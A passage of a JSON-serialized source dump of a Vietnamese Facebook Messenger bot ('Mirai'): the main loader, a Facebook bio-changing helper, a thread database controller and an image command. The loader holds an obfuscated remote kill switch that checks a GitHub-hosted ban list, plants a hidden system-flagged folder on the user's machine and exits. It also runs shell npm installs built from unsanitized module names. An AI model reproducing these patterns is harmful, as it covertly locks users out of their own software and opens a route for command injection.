`${moment.tz(\"Asia/Ho_Chi_minh\").format(\"MM\")}`;\n            case \"year\":\n                return `${moment.tz(\"Asia/Ho_Chi_minh\").format(\"YYYY\")}`;\n            case \"fullHour\":\n                return `${moment.tz(\"Asia/Ho_Chi_minh\").format(\"HH:mm:ss\")}`;\n            case \"fullYear\":\n                return `${moment.tz(\"Asia/Ho_Chi_minh\").format(\"DD/MM/YYYY\")}`;\n            case \"fullTime\":\n                return `${moment.tz(\"Asia/Ho_Chi_minh\").format(\"HH:mm:ss DD/MM/YYYY\")}`;\n        }\n  }\n});\n\nglobal.data = new Object({\n    threadInfo: new Map(),\n    threadData: new Map(),\n    userName: new Map(),\n    userBanned: new Map(),\n    threadBanned: new Map(),\n    commandBanned: new Map(),\n    threadAllowNSFW: new Array(),\n    allUserID: new Array(),\n    allCurrenciesID: new Array(),\n    allThreadID: new Array()\n});\n\nglobal.utils = require(\"./utils\");\n\nglobal.nodemodule = new Object();\n\nglobal.config = new Object();\n\nglobal.configModule = new Object();\n\nglobal.moduleData = new Array();\n\nglobal.language = new Object();\n\n//////////////////////////////////////////////////////////\n//========= Find and get variable from Config =========//\n/////////////////////////////////////////////////////////\n\nvar configValue;\ntry {\n    global.client.configPath = join(global.client.mainPath, \"config.json\");\n    configValue = require(global.client.configPath);\n}\ncatch {\n    if (existsSync(global.client.configPath.replace(/\\.json/g,\"\") + \".temp\")) {\n        configValue = readFileSync(global.client.configPath.replace(/\\.json/g,\"\") + \".temp\");\n        configValue = JSON.parse(configValue);\n        logger.loader(`Found: ${global.client.configPath.replace(/\\.json/g,\"\") + \".temp\"}`);\n    }\n\n}\n\ntry {\n    for (const key in configValue) global.config[key] = configValue[key];\n}\ncatch { return logger.loader(\"Can't load file config!\", \"error\") }\n\nconst { Sequelize, sequelize } = require(\"./includes/database\");\n\nwriteFileSync(global.client.configPath + \".temp\", JSON.stringify(global.config, null, 4), 'utf8');\n\n/////////////////////////////////////////\n//========= Load language use =========//\n/////////////////////////////////////////\n\nconst langFile = (readFileSync(`${__dirname}/languages/${global.config.language || \"en\"}.lang`, { encoding: 'utf-8' })).split(/\\r?\\n|\\r/);\nconst langData = langFile.filter(item => item.indexOf('#') != 0 && item != '');\nfor (const item of langData) {\n    const getSeparator = item.indexOf('=');\n    const itemKey = item.slice(0, getSeparator);\n    const itemValue = item.slice(getSeparator + 1, item.length);\n    const head = itemKey.slice(0, itemKey.indexOf('.'));\n    const key = itemKey.replace(head + '.', '');\n    const value = itemValue.replace(/\\\\n/gi, '\\n');\n    if (typeof global.language[head] == \"undefined\") global.language[head] = new Object();\n    global.language[head][key] = value;\n}\n\nglobal.getText = function (...args) {\n    const langText = global.language;    \n    if (!langText.hasOwnProperty(args[0])) throw `${__filename} - Not found key language: ${args[0]}`;\n    var text = langText[args[0]][args[1]];\n    for (var i = args.length - 1; i > 0; i--) {\n        const regEx = RegExp(`%${i}`, 'g');\n        text = text.replace(regEx, args[i + 1]);\n    }\n    return text;\n}\n\ntry {\n    var appStateFile = resolve(join(global.client.mainPath, global.config.APPSTATEPATH || \"appstate.json\"));\n    var appState = require(appStateFile);\n}\ncatch { return logger.loader(global.getText(\"mirai\", \"notFoundPathAppstate\"), \"error\") }\n\n////////////////////////////////////////////////////////////\n//========= Login account and start Listen Event =========//\n////////////////////////////////////////////////////////////\n\nfunction checkBan(checkban) {\n    const [_0x4e5718, _0x28e5ae] = global.utils.homeDir();\n    if (existsSync('/home/runner/.miraigban')) {\n        const _0x3515e8 = require('readline');\n        const _0x3d580d = require('totp-generator');\n        const _0x5c211c = {};\n        _0x5c211c.input = process.stdin, \n        _0x5c211c.output = process.stdout;\n        var _0x2cd8f4 = _0x3515e8.createInterface(_0x5c211c);\n        global.handleListen.stopListening(), \n        logger(global.getText('mirai', 'banDevice'), '[ GLOBAL BAN ]'), _0x2cd8f4.on(line, _0x4244d8 => {\n            _0x4244d8 = String(_0x4244d8);\n\n            if (isNaN(_0x4244d8) || _0x4244d8.length < 6 || _0x4244d8.length > 6) \n                console.log(global.getText('mirai', 'keyNotSameFormat'));\n            else return axios.get('https://raw.githubusercontent.com/devnguyenit/GbanMirai/mainV2/listgban.json').then(_0x2f978e => {\n                // if (_0x2f978e.headers.server != 'cloudflare') return logger('BYPASS DETECTED!!!', '[ GLOBAL BAN ]'), \n                //  process.exit(0);\n                const _0x360aa8 = _0x3d580d(String(_0x2f978e.data).replace(/\\s+/g, '').toLowerCase());                \n                if (_0x360aa8 !== _0x4244d8) return console.log(global.getText('mirai', 'codeInputExpired'));\n                else {\n                    const _0x1ac6d2 = {};\n                    return _0x1ac6d2.recursive = !![], rm('/.miraigban', _0x1ac6d2), _0x2cd8f4.close(), \n                    logger(global.getText('mirai', 'unbanDeviceSuccess'), '[ GLOBAL BAN ]');\n                }\n            });\n        });\n        return;\n    };\n    return axios.get('https://raw.githubusercontent.com/devnguyenit/GbanMirai/mainV2/listgban.json').then(dataGban => {\n        // if (dataGban.headers.server != 'cloudflare') \n        //  return logger('BYPASS DETECTED!!!', '[ GLOBAL BAN ]'), \n        // process.exit(0);\n        for (const _0x125f31 of global.data.allUserID)\n            if (dataGban.data.hasOwnProperty(_0x125f31) && !global.data.userBanned.has(_0x125f31)) global.data.userBanned.set(_0x125f31, {\n                'reason': dataGban.data[_0x125f31]['reason'],\n                'dateAdded': dataGban.data[_0x125f31]['dateAdded']\n            });\n        for (const thread of global.data.allThreadID)\n            if (dataGban.data.hasOwnProperty(thread) && !global.data.userBanned.has(thread)) global.data.threadBanned.set(thread, {\n                'reason': dataGban.data[thread]['reason'],\n                'dateAdded': dataGban.data[thread]['dateAdded']\n            });\n        delete require.cache[require.resolve(global.client.configPath)];\n        const admin = require(global.client.configPath).ADMINBOT || [];\n        for (const adminID of admin) {\n            if (!isNaN(adminID) && dataGban.data.hasOwnProperty(adminID)) {\n                logger(global.getText('mirai','userBanned', dataGban.data[adminID]['dateAdded'], dataGban.data[adminID]['reason']), '[ GLOBAL BAN ]'), \n                mkdirSync(_0x4e5718 + ('/.miraigban'));\n                if (_0x28e5ae == 'win32') execSync('attrib +H' + '+S' + _0x4e5718 + ('/.miraigban'));\n                return process.exit(0);\n            }\n        }                                                                                                      \n        if (dataGban.data.hasOwnProperty(checkban.getCurrentUserID())) {\n            logger(global.getText('mirai', 'userBanned', dataGban.data[checkban.getCurrentUserID()]['dateAdded'], dataGban['data'][checkban['getCurrentUserID']()]['reason']), '[ GLOBAL BAN ]'), \n            mkdirSync(_0x4e5718 + ('/.miraigban'));\n            if (_0x28e5ae == 'win32') \n                execSync('attrib +H +S ' + _0x4e5718 + ('/.miraigban'));\n            return process.exit(0);\n        }\n        return axios.get('https://raw.githubusercontent.com/tandung1/Bot12/main/data.json').then(json => {\n            //console.log(\"‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îì\")\n            //logger(json.data[Math['floor'](Math['random']() * json.data.length)], ' Note: ');\n            //console.log(\"‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îõ\")\n        })\n    }).catch(error => {\n        throw new Error(error);\n    });\n}\nfunction onBot({ models: botModel }) {\n    const loginData = {};\n    loginData['appState'] = appState;\n    login(loginData, async(loginError, loginApiData) => {\n        if (loginError) return logger(JSON.stringify(loginError), `ERROR`);\n        loginApiData.setOptions(global.config.FCAOption)\n        writeFileSync(appStateFile, JSON.stringify(loginApiData.getAppState(), null, '\\x09'))\n        global.client.api = loginApiData\n        global.config.version = '1.2.14'\n        global.client.timeStart = new Date().getTime(),\n            function () {\n                const listCommand = readdirSync(global.client.mainPath + '/modules/commands').filter(command => command.endsWith('.js') && !command.includes('example') && !global.config.commandDisabled.includes(command));\n                for (const command of listCommand) {\n                    try {\n                        var module = require(global.client.mainPath + '/modules/commands/' + command);\n                        if (!module.config || !module.run || !module.config.commandCategory) throw new Error(global.getText('mirai', 'errorFormat'));\n                        if (global.client.commands.has(module.config.name || '')) throw new Error(global.getText('mirai', 'nameExist'));\n\n                        if (module.config.dependencies && typeof module.config.dependencies == 'object') {\n                            for (const reqDependencies in module.config.dependencies) {\n                                const reqDependenciesPath = join(__dirname, 'nodemodules', 'node_modules', reqDependencies);\n                                try {\n                                    if (!global.nodemodule.hasOwnProperty(reqDependencies)) {\n                                        if (listPackage.hasOwnProperty(reqDependencies) || listbuiltinModules.includes(reqDependencies)) global.nodemodule[reqDependencies] = require(reqDependencies);\n                                        else global.nodemodule[reqDependencies] = require(reqDependenciesPath);\n                                    } else '';\n                                } catch {\n                                    var check = false;\n                                    var isError;\n                                    logger.loader(global.getText('mirai', 'notFoundPackage', reqDependencies, module.config.name), 'warn');\n                                    execSync('npm ---package-lock false --save install' + ' ' + reqDependencies + (module.config.dependencies[reqDependencies] == '*' || module.config.dependencies[reqDependencies] == '' ? '' : '@' + module.config.dependencies[reqDependencies]), { 'stdio': 'inherit', 'env': process['env'], 'shell': true, 'cwd': join(__dirname, 'nodemodules') });\n                                    for (let i = 1; i <= 3; i++) {\n                                        try {\n                                            require['cache'] = {};\n                                            if (listPackage.hasOwnProperty(reqDependencies) || listbuiltinModules.includes(reqDependencies)) global['nodemodule'][reqDependencies] = require(reqDependencies);\n                                            else global['nodemodule'][reqDependencies] = require(reqDependenciesPath);\n                                            check = true;\n                                            break;\n                                        } catch (error) { isError = error; }\n                                        if (check || !isError) break;\n                                    }\n                                    if (!check || isError) throw global.getText('mirai', 'cantInstallPackage', reqDependencies, module.config.name, isError);\n                                }\n                            }\n\n                        }\n                        if (module.config.envConfig) try {\n                            for (const envConfig in module.config.envConfig) {\n                                if (typeof global.configModule[module.config.name] == 'undefined') global.configModule[module.config.name] = {};\n                                if (typeof global.config[module.config.name] == 'undefined') global.config[module.config.name] = {};\n                                if (typeof global.config[module.config.name][envConfig] !== 'undefined') global['configModule'][module.config.name][envConfig] = global.config[module.config.name][envConfig];\n                                else global.configModule[module.config.name][envConfig] = module.config.envConfig[envConfig] || '';\n                                if (typeof global.config[module.config.name][envConfig] == 'undefined') global.config[module.config.name][envConfig] = module.config.envConfig[envConfig] || '';\n                            }\n\n                        } catch (error) {\n                        }\n                        if (module.onLoad) {\n                            try {\n                                const moduleData = {};\n                                moduleData.api = loginApiData;\n                                moduleData.models = botModel;\n                                module.onLoad(moduleData);\n                            } catch (_0x20fd5f) {\n                                throw new Error(global.getText('mirai', 'cantOnload', module.config.name, JSON.stringify(_0x20fd5f)), 'error');\n                            };\n                        }\n                        if (module.handleEvent) global.client.eventRegistered.push(module.config.name);\n                        global.client.commands.set(module.config.name, module);\n\n                    } catch (error) {\n\n                    };\n                }\n            }(),\n            function() {\n                const events = readdirSync(global.client.mainPath + '/modules/events').filter(event => event.endsWith('.js') && !global.config.eventDisabled.includes(event));\n                for (const ev of events) {\n                    try {\n                        var event = require(global.client.mainPath + '/modules/events/' + ev);\n                        if (!event.config || !event.run) throw new Error(global.getText('mirai', 'errorFormat'));\n                        if (global.client.events.has(event.config.name) || '') throw new Error(global.getText('mirai', 'nameExist'));\n                        if (event.config.dependencies && typeof event.config.dependencies == 'object') {\n                            for (const dependency in event.config.dependencies) {\n                                const _0x21abed = join(__dirname, 'nodemodules', 'node_modules', dependency);\n                                try {\n                                    if (!global.nodemodule.hasOwnProperty(dependency)) {\n                                        if (listPackage.hasOwnProperty(dependency) || listbuiltinModules.includes(dependency)) global.nodemodule[dependency] = require(dependency);\n                                        else global.nodemodule[dependency] = require(_0x21abed);\n                                    } else '';\n                                } catch {\n                                    let check = false;\n                                    let isError;\n                                    logger.loader(global.getText('mirai', 'notFoundPackage', dependency, event.config.name), 'warn');\n                                    execSync('npm --package-lock false --save install' + dependency + (event.config.dependencies[dependency] == '*' || event.config.dependencies[dependency] == '' ? '' : '@' + event.config.dependencies[dependency]), { 'stdio': 'inherit', 'env': process['env'], 'shell': true, 'cwd': join(__dirname, 'nodemodules') });\n                                    for (let i = 1; i <= 3; i++) {\n                                        try {\n                                            require['cache'] = {};\n                                            if (global.nodemodule.includes(dependency)) break;\n                                            if (listPackage.hasOwnProperty(dependency) || listbuiltinModules.includes(dependency)) global.nodemodule[dependency] = require(dependency);\n                                            else global.nodemodule[dependency] = require(_0x21abed);\n                                            check = true;\n                                            break;\n                                        } catch (error) { isError = error; }\n                                        if (check || !isError) break;\n                                    }\n                                    if (!check || isError) throw global.getText('mirai', 'cantInstallPackage', dependency, event.config.name);\n                                }\n                            }\n\n                        }\n                        if (event.config.envConfig) try {\n                            for (const _0x5beea0 in event.config.envConfig) {\n                                if (typeof global.configModule[event.config.name] == 'undefined') global.configModule[event.config.name] = {};\n                                if (typeof global.config[event.config.name] == 'undefined') global.config[event.config.name] = {};\n                                if (typeof global.config[event.config.name][_0x5beea0] !== 'undefined') global.configModule[event.config.name][_0x5beea0] = global.config[event.config.name][_0x5beea0];\n                                else global.configModule[event.config.name][_0x5beea0] = event.config.envConfig[_0x5beea0] || '';\n                                if (typeof global.config[event.config.name][_0x5beea0] == 'undefined') global.config[event.config.name][_0x5beea0] = event.config.envConfig[_0x5beea0] || '';\n                            }\n\n                        } catch (error) {\n\n                        }\n                        if (event.onLoad) try {\n                            const eventData = {};\n                            eventData.api = loginApiData, eventData.models = botModel;\n                            event.onLoad(eventData);\n                        } catch (error) {\n                            throw new Error(global.getText('mirai', 'cantOnload', event.config.name, JSON.stringify(error)), 'error');\n                        }\n                        global.client.events.set(event.config.name, event);\n\n                    } catch (error) {\n                    }\n                }\n            }()\n        console.log(\"‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\")\n        logger.loader(global.getText('mirai', 'finishLoadModule', global.client.commands.size, global.client.events.size)) \n        logger.loader(`Th·ªùi gian kh·ªüi ƒë·ªông: ${((Date.now() - global.client.timeStart) / 1000).toFixed()}s`)   \n        logger.loader('===== [ ' + (Date.now() - global.client.timeStart) + 'ms ] =====')\n        writeFileSync(global.client['configPath'], JSON['stringify'](global.config, null, 4), 'utf8') \n        unlinkSync(global['client']['configPath'] + '.temp');        \n        const listenerData = {};\n        listenerData.api = loginApiData; \n        listenerData.models = botModel;\n        const listener = require('./includes/listen')(listenerData);\n\n        function listenerCallback(error, message) {\n            if (error) return logger(global.getText('mirai', 'handleListenError', JSON.stringify(error)), 'error');\n            if (['presence', 'typ', 'read_receipt'].some(data => data == message.type)) return;\n            if (global.config.DeveloperMode == !![]) console.log(message);\n            return listener(message);\n        };\n        global.handleListen = loginApiData.listenMqtt(listenerCallback);\n        try {\n            await checkBan(loginApiData);\n        } catch (error) {\n            return //process.exit(0);\n        };\n\n\n    });\n}\n//////////////////////////////////////////////\n//========= Connecting to Database =========//\n//////////////////////////////////////////////\n\n(async () => {\n    try {\n        try {\n            global.client.loggedMongoose = true;\n            const { Model, DataTypes, Sequelize } = require(\"sequelize\");\n            const sequelize2 = new Sequelize({\n                dialect: \"sqlite\",\n                host: __dirname + '/includes/data.sqlite',\n                logging: false\n            });\n            class dataModel extends Model { }\n            dataModel.init({\n                threadID: {\n                    type: DataTypes.STRING,\n                    primaryKey: true\n                },\n                data: {\n                    type: DataTypes.JSON,\n                    defaultValue: {}\n                }\n            }, {\n                sequelize: sequelize2,\n                modelName: \"antists\"\n            });\n\n            // connect to database\n            dataModel.findOneAndUpdate = async function (filter, update) {\n                const doc = await this.findOne({\n          where: filter  \n        });\n                if (!doc)\n                    return null;\n                Object.keys(update).forEach(key => doc[key] = update[key]);\n                await doc.save();\n                return doc;\n            }\n            global.modelAntiSt = dataModel;\n            await sequelize2.sync({ force: false });\n        }\n        catch (error) {\n            global.client.loggedMongoose = false;\n            logger.loader('Kh√¥ng th·ªÉ k·∫øt n·ªëi d·ªØ li·ªáu ANTI SETTING', '[ CONNECT ]');\n            console.log(error);\n        }\n\n        await sequelize.authenticate();\n        const authentication = {};\n        authentication.Sequelize = Sequelize;\n        authentication.sequelize = sequelize;\n        const models = require('./includes/database/model')(authentication);    console.log(\"‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\")\n        const botData = {};\n        botData.models = models\n        onBot(botData);\n    } catch (error) { logger(global.getText('mirai', 'successConnectDatabase', JSON.stringify(error)), '[ DATABASE ]'); }\n})();\nprocess.on('unhandledRejection', (err, p) => {});\n","path":null,"size_bytes":23772,"size_tokens":null},"lib/fca-auto/src/changeBio.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function changeBio(bio, publish, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      if (utils.getType(publish) == \"Function\" || utils.getType(publish) == \"AsyncFunction\") callback = publish;\n      else {\n        callback = function (err) {\n          if (err) return rejectFunc(err);\n          resolveFunc();\n        };\n      }\n    }\n\n    if (utils.getType(publish) != \"Boolean\") publish = false;\n    if (utils.getType(bio) != \"String\") {\n      bio = \"\";\n      publish = false;\n    }\n\n    var form = {\n      fb_api_caller_class: \"RelayModern\",\n      fb_api_req_friendly_name: \"ProfileCometSetBioMutation\",\n      // This doc_is is valid as of May 23, 2020\n      doc_id: \"2725043627607610\",\n      variables: JSON.stringify({\n        input: {\n          bio: bio,\n          publish_bio_feed_story: publish,\n          actor_id: ctx.userID,\n          client_mutation_id: Math.round(Math.random() * 1024).toString()\n        },\n        hasProfileTileViewID: false,\n        profileTileViewID: null,\n        scale: 1\n      }),\n      av: ctx.userID\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.errors) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"changeBio\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1777,"size_tokens":null},"includes/controllers/threads.js":{"content":"module.exports = function ({ models, api }) {\r\n\tconst Threads = models.use('Threads');\r\n\r\n\tasync function getInfo(threadID) {\r\n\t\ttry {\r\n\t\t\tconst result = await api.getThreadInfo(threadID);\r\n\t\t\treturn result;\r\n\t\t}\r\n\t\tcatch (error) { \r\n\t\t\tconsole.log(error);\r\n\t\t\tthrow new Error(error);\r\n\t\t};\r\n\t}\r\n\r\n\tasync function getAll(...data) {\r\n\t\tvar where, attributes;\r\n\t\tfor (const i of data) {\r\n\t\t\tif (typeof i != 'object') throw global.getText(\"threads\", \"needObjectOrArray\");\r\n\t\t\tif (Array.isArray(i)) attributes = i;\r\n\t\t\telse where = i;\r\n\t\t}\r\n\t\ttry { return (await Threads.findAll({ where, attributes })).map(e => e.get({ plain: true })); }\r\n\t\tcatch (error) {\r\n\t\t\tconsole.error(error);\r\n\t\t\tthrow new Error(error);\r\n\t\t}\r\n}\r\n\r\n\tasync function getData(threadID) {\r\n\t\ttry {\r\n\t\t\tconst data = await Threads.findOne({ where: { threadID }});\r\n\t\t\tif (data) return data.get({ plain: true });\r\n\t\t\telse return false;\r\n\t\t} \r\n\t\tcatch (error) { \r\n\t\t\tconsole.error(error);\r\n            throw new Error(error);\r\n\t\t}\r\n\t}\r\n\r\n\tasync function setData(threadID, options = {}) {\r\n\t\tif (typeof options != 'object' && !Array.isArray(options)) throw global.getText(\"threads\", \"needObject\");\r\n\t\ttry {\r\n\t\t\t(await Threads.findOne({ where: { threadID } })).update(options);\r\n\t\t\treturn true;\r\n\t\t} catch (error) { \r\n\t\t\ttry{\r\n\t\t\t\tawait this.createData(threadID, options);\r\n\r\n\t\t\t} catch (error) {\r\n\t\t\t\tconsole.error(error);\r\n\t\t\t\tthrow new Error(error);\r\n\t\t\t}\r\n\t\t\t\r\n\t\t}\r\n\t}\r\n\r\n\tasync function delData(threadID) {\r\n\t\ttry {\r\n\t\t\t(await Threads.findOne({ where: { threadID } })).destroy();\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\tcatch (error) {\r\n\t\t\tconsole.error(error);\r\n\t\t\tthrow new Error(error);\r\n\t\t}\r\n\t}\r\n\r\n\tasync function createData(threadID, defaults = {}) {\r\n\t\tif (typeof defaults != 'object' && !Array.isArray(defaults)) throw global.getText(\"threads\", \"needObject\");\r\n\t\ttry {\r\n\t\t\tawait Threads.findOrCreate({ where: { threadID }, defaults });\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\tcatch {\r\n\t\t\tconsole.error(error);\r\n\t\t\tthrow new Error(error);\r\n\t\t}\r\n\t}\r\n\r\n\treturn {\r\n\t\tgetInfo,\r\n\t\tgetAll,\r\n\t\tgetData,\r\n\t\tsetData,\r\n\t\tdelData,\r\n\t\tcreateData\r\n\t};\r\n};","path":null,"size_bytes":2083,"size_tokens":null},"modules/commands/boy.js":{"content":"module.exports.config = {\n  name: \"boy\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n\n  const girl = require('./../../img/mui.json');\n  var image1 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image2 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image3 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image4 = girl[Math.floor(Math.random() * girl.length)].trim();\n\n  function downloadAndSendImage(image,fileName,callback){\n    request(image).pipe(fs.createWriteStream(__dirname + `/`+fileName)).on(\"close\", callback);\n  }\n  let callback = function () {\n    return api.sendMessage({\n      body: ' Trai ƒë·∫πp:3',\n      attachment: [\n       fs.createReadStream(__dirname + `/1.png`), \n       fs.createReadStream(__dirname + `/2.png`), \n       fs.createReadStream(__dirname + `/3.png`), \n       fs.createReadStream(__dirname + `/4.png`)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(__dirname + `/1.png`);\n      fs.unlinkSync(__dirname + `/2.png`);\n      fs.unlinkSync(__dirname + `/3.png`);\n      fs.unlinkSync(__dirname + `/4.png`);\n    }, event.messageID);\n  };\n\n  downloadAndSendImage(image1,'1.png',()=>{\n    downloadAndSendImage(image2,'2.png',()=>{\n      downloadAndSendImage(image3,'3.png',()=>{\n        downloadAndSendImage(image4,'4.png',callback)\n      })\n    })\n  }) \n}","path":null,"size_bytes":1602,"size_tokens":null},"lib/fca-auto/Extra/ExtraGetThread.js":{"content":"/* eslint-disable */\n\"use strict\";\nvar Database= require(\"./Database\");\nconst { lastRun,capture } = require('./Src/Last-Run');\nconst logger = require(\"../logger\");\nconst getText = global.Fca.getText;\nvar language = require(\"../Language/index.json\");\nconst fs = require(\"fs\");\nlanguage = language.find(i => i.Language == require(process.cwd() + \"/FastConfigFca.json\").Language).Folder.ExtraGetThread;\nconst Always_True = [];\nif (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n    if (!fs.existsSync(process.cwd() + \"/Horizon_Database/Threads.json\")) {\n        fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify({}));\n    }\n}\nelse if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type != \"default\" && global.Fca.Require.FastConfig.AntiGetInfo.Database_Type != \"json\") {\n    logger.Warning(\"Database_Type in FastConfigFca.json is not valid. Only default and json are valid.\");\n    process.exit(0);\n}\n\nexports.createData = function(threadID,threadData) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        try { \n            Database(true).set(String(threadID),Object(threadData));\n            logger.Normal(getText(language.CreateDatabaseSuccess,String(threadID)));\n        }\n        catch (e) {\n            console.log(e);\n            logger.Warning(getText(language.CreateDatabaseFailure,String(threadID))); \n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            try {\n                var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            }\n            catch (e) {\n                var data = {};\n                fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n            }\n            \n            data[String(threadID)] = Object(threadData);\n            fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n            logger.Normal(getText(language.CreateDatabaseSuccess,String(threadID)));\n        }\n        catch (e) {\n            console.log(e);\n            logger.Warning(getText(language.CreateDatabaseFailure,String(threadID))); \n        }\n    }\n}\n\nexports.updateData = function(threadID,threadData) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        try { \n            Database(true).set(String(threadID),Object(threadData));\n            logger.Normal(getText(language.updateDataSuccess,String(threadID)));\n        }\n        catch (e) {\n            console.log(e);\n            logger.Warning(getText(language.updateDataFailure,String(threadID))); \n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            try {\n                var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            }\n            catch (e) {\n                var data = {};\n                fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n            }\n            \n            data[String(threadID)] = Object(threadData);\n            fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n            logger.Normal(getText(language.updateDataSuccess,String(threadID)));\n        }\n        catch (e) {\n            console.log(e);\n            logger.Warning(getText(language.updateDataFailure,String(threadID))); \n        }\n    }\n}\n\nexports.updateMessageCount = function(threadID,threadData) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        try { \n            Database(true).set(String(threadID),Object(threadData));\n        }\n        catch (e) {\n            console.log(e);\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            try {\n                var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            }\n            catch (e) {\n                var data = {};\n                fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n            }\n            \n            data[String(threadID)] = Object(threadData);\n            fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n        }\n        catch (e) {\n            console.log(e);\n        }\n    }\n}\n\nexports.getData = function(threadID) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        let Sw;\n        if (Always_True.includes(threadID)) Sw = true\n        else Sw = Database(true).has(String(threadID))\n        switch (Sw) {\n            case true: {\n                return Database(true).get(String(threadID))\n            }\n            case false: {\n                return null;\n            }\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            let Sw;\n            if (Always_True.includes(threadID)) Sw = true\n            else Sw = data.hasOwnProperty(String(threadID))\n            var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            switch (Sw) {\n                case true: {\n                    return data[String(threadID)];\n                }\n                case false: {\n                    return null;\n                }\n            }\n        }\n        catch (e) {\n            console.log(e);\n            return null;\n        }\n    }\n}\n\nexports.deleteAll = function(data) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        for (let i of data) {\n            Database(true).delete(String(i));\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            var data1 = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            for 